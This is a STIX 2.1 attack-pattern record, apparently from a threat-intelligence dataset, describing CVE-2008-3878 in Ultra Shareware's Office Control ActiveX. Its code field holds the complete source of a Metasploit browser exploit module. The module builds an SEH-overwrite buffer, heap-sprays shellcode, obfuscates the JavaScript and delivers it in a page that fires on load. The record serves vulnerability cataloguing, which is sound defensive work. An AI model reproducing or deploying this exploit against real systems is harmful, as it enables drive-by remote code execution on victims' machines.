{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99a68396-6b73-47c8-87e8-53eaaf45b636",
    "created": "2024-08-14T16:45:10.869122Z",
    "modified": "2024-08-14T16:45:10.869127Z",
    "name": "Ultra Shareware Office Control ActiveX HttpUpload Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Ultra Shareware's Office Control. When processing the 'HttpUpload' method, the arguments are concatenated",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ultraoffice_httpupload.rb",
            "external_id": "ultraoffice_httpupload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3878"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ultra Shareware Office Control ActiveX HttpUpload Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Ultra Shareware's Office\n        Control. When processing the 'HttpUpload' method, the arguments are concatenated\n        together to form a command line to run a bundled version of cURL. If the command\n        fails to run, a stack-based buffer overflow occurs when building the error\n        message. This is due to the use of sprintf() without proper bounds checking.\n\n        NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload\n        into memory unmodified.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'shinnai', 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-3878' ],\n          [ 'OSVDB', '47866' ],\n          [ 'BID', '30861' ],\n          [ 'EDB', '6318' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 4096,\n          'BadChars' => \"\\x00\",\n          # For HttpUpload args: \"\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8e\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9e\\x9f\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested with ActiveX v2.0.0.1020 and v2.0.2008.801\n          [ 'Windows Universal',\n            {\n              'Ret' => 0x0c0c0c0c  # heap sprayed\n              # 0x746C15A9 # p/p/r in msls31.dll\n              # EEK, Safe SEH! 0x220118c2  # p/p/r in OfficeCtrl.ocx\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-08-27'))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    # ActiveX parameters\n    progid = \"Ultra.OfficeControl\"\n    clsid = \"00989888-BB72-4E31-A7C6-5F819C24D2F7\"\n\n    # Set parameters\n    fnname = rand_text_alpha(8+rand(8))\n    arg1 = rand_text_alphanumeric(128)\n    arg2 = rand_text_alphanumeric(4096) * 10\n    seh_offset = 252\n\n    # Build the exploit buffer\n    sploit = rand_text_alphanumeric(seh_offset)\n    sploit << generate_seh_record(target.ret)\n\n    # Encode variables\n    sploit = Rex::Text.to_hex(sploit, '%')\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Prepare the heap spray parameters\n    spray_addr = target.ret\n    spray_num = \"0x%x\" % spray_addr\n\n    # Generate the final javascript\n    js = %Q|\nfunction #{fnname}()\n{\ntry {\nvar obj = new ActiveXObject(\"#{progid}\");\nvar my_unescape = unescape;\nvar shellcode = '#{shellcode}';\n#{js_heap_spray}\nsprayHeap(my_unescape(shellcode), #{spray_num}, 0x40000);\nvar arg1 = my_unescape(\"#{arg1}\");\nvar arg2 = my_unescape(\"#{arg2}\");\nvar sploit = my_unescape(\"#{sploit}\");\nobj.HttpUpload(arg1, arg2, sploit);\n} catch( e ) { window.location = 'about:blank' ; }\n}\n|\n\n    # Obfuscate the javascript\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => %w{ obj my_unescape shellcode arg1 arg2 sploit }\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.obfuscate(memory_sensitive: true)\n\n    # Build the final HTML\n    content = %Q|<html>\n<head>\n<script language=javascript>\n#{js}\n</script>\n</head>\n<body onload=\"#{fnname}()\">\nPlease wait...\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_contributors": [
        "[ shinnai",
        "jduck ]",
        ""
    ],
    "x_mitre_disclosure_date": "2008-08-27",
    "x_mitre_platforms": [
        "win'"
    ]
}